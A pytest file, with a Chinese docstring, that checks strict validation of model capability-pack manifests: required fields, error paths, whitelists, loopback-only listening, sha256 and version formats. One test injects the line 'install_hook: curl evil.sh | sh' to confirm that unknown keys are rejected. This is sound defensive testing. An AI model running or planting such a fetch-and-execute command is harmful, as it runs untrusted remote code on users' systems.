"""能力包 Manifest 严格解析 — PK0 契约（Task 1）。

契约（计划 Interfaces）：
- parse_manifest(str|dict) -> PackManifest；未知键任何层级拒绝（防任意
  install_hook 注入）；listen 仅 loopback；capability 白名单
  {"llm","vl","asr","tts","embedding","rerank","ocr"}；sha256 必须 64 hex；
  pack_id 格式 <capability>.<slug>；pack_version 语义化三段。
- ManifestError 带 .field 点路径（如 artifacts[0].sha256）。
"""

import pytest

from inferfabric.packs.schema import ManifestError, parse_manifest
from tests.unit.tests_fixtures_packs import A64 as _A64
from tests.unit.tests_fixtures_packs import MINIMAL_MANIFEST_YAML as MINIMAL_YAML


def test_minimal_manifest_parses_roundtrip():
    m = parse_manifest(MINIMAL_YAML)
    assert m.pack_id == "llm.qwen3-4b-instruct-2507"
    assert m.pack_version == "1.0.0"
    assert m.capability == "llm"
    assert m.model_id == "qwen3-4b-instruct-2507"
    assert m.parameter_count_b == 4
    assert m.quantization == "q4_k_m"
    assert m.license == "apache-2.0"
    assert m.engine == "llama_cpp"
    assert m.runtime_template == "llama-cpp-macos-arm64-v1"
    assert (m.download_mb, m.disk_mb, m.peak_memory_mb) == (3200, 3400, 4800)
    assert m.gpu_role == "shared"
    assert m.lifecycle_mode == "on_demand"
    assert m.listen == "loopback" and m.allowed_upstream == ()
    assert m.artifacts[0].id == "model" and m.artifacts[0].sha256 == _A64
    assert m.artifacts[1].kind == "runtime"
    assert m.model_config_template == "llama_cpp_chat_v1"
    assert m.healthcheck == "openai_chat_ready_v1"
    assert m.sandbox_policy == "verified-local-pack-v1"
    assert m.degraded_install_allowed is True
    # roundtrip：str → dict → str → dict 恒等
    assert parse_manifest(m.to_dict_yaml()).to_dict() == m.to_dict()


def test_parse_accepts_plain_dict():
    import yaml
    d = yaml.safe_load(MINIMAL_YAML)
    assert parse_manifest(d).to_dict() == parse_manifest(MINIMAL_YAML).to_dict()


def test_missing_required_field_reports_path():
    bad = MINIMAL_YAML.replace(
        "sandbox: {policy: verified-local-pack-v1, degraded_install_allowed: true}", "")
    with pytest.raises(ManifestError) as e:
        parse_manifest(bad)
    assert e.value.field == "sandbox"


def test_missing_nested_field_reports_path():
    bad = MINIMAL_YAML.replace(", license: apache-2.0", "")
    with pytest.raises(ManifestError) as e:
        parse_manifest(bad)
    assert e.value.field == "model.license"


def test_unknown_top_level_key_rejected():
    bad = MINIMAL_YAML + "\ninstall_hook: curl evil.sh | sh\n"
    with pytest.raises(ManifestError):
        parse_manifest(bad)


def test_unknown_nested_key_rejected():
    bad = MINIMAL_YAML.replace(
        "lifecycle: {mode: on_demand}",
        "lifecycle: {mode: on_demand, post_install: script}")
    with pytest.raises(ManifestError) as e:
        parse_manifest(bad)
    assert e.value.field == "lifecycle.post_install"


def test_bad_sha256_rejected_with_artifact_path():
    bad = MINIMAL_YAML.replace(_A64, "zz")
    with pytest.raises(ManifestError) as e:
        parse_manifest(bad)
    assert "artifacts" in e.value.field


def test_bad_artifact_kind_rejected():
    bad = MINIMAL_YAML.replace("kind: model", "kind: hook")
    with pytest.raises(ManifestError):
        parse_manifest(bad)


def test_listen_must_be_loopback():
    bad = MINIMAL_YAML.replace("listen: loopback", "listen: 0.0.0.0")
    with pytest.raises(ManifestError):
        parse_manifest(bad)


def test_capability_whitelist():
    bad = MINIMAL_YAML.replace("capability: llm", "capability: video_gen")
    with pytest.raises(ManifestError):
        parse_manifest(bad)


def test_pack_id_must_match_capability_prefix():
    bad = MINIMAL_YAML.replace("pack_id: llm.", "pack_id: asr.")
    with pytest.raises(ManifestError) as e:
        parse_manifest(bad)
    assert e.value.field == "pack_id"


def test_pack_version_must_be_semver_three_part():
    bad = MINIMAL_YAML.replace("pack_version: 1.0.0", "pack_version: 1.0")
    with pytest.raises(ManifestError) as e:
        parse_manifest(bad)
    assert e.value.field == "pack_version"


def test_resources_must_be_positive():
    bad = MINIMAL_YAML.replace("peak_memory_mb: 4800", "peak_memory_mb: -1")
    with pytest.raises(ManifestError) as e:
        parse_manifest(bad)
    assert e.value.field == "resources.peak_memory_mb"


def test_gpu_role_whitelist():
    bad = MINIMAL_YAML.replace("gpu_role: shared", "gpu_role: sometimes")
    with pytest.raises(ManifestError):
        parse_manifest(bad)


def test_empty_artifacts_allowed_for_builtin_packs():
    # 系统内置能力（spec §3.5）无下载 artifact；artifacts 仍必须是列表
    import re
    stripped = re.sub(r"^artifacts:\n(  - .*\n)+", "artifacts: []\n",
                      MINIMAL_YAML, flags=re.M)
    m = parse_manifest(stripped)
    assert m.artifacts == ()
